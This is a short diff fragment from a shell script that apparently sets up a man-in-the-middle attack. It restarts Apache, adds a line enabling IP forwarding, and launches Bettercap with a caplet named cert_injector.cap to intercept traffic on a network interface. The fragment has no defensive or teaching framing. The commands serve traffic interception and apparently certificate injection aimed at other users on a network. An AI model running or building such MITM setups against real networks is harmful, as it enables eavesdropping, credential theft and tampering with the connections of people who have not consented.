@@ -251,6 +251,9 @@ chmod +x "$MITM_DIR/cert_injector.cap"
 color_print GREEN "[*] Restarting Apache..."
 service apache2 restart
 
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
 # Launch Bettercap
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap"
 ```
